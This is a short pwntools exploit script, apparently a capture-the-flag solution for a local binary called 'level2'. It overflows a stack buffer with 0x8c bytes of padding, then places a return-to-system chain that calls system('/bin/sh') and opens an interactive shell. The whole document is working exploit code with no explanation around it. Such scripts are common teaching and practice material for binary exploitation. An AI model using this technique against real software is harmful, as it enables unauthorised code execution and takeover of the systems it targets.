from pwn import *

p = process('./level2')
elf = ELF("./level2")

sys_addr = elf.symbols["system"]
bin_addr = elf.search("/bin/sh").next()

payload = 'a'*0x8c
payload += p32(sys_addr)
payload += p32(0x12345678)
payload += p32(bin_addr)

p.recvline()
p.sendline(payload)
p.interactive()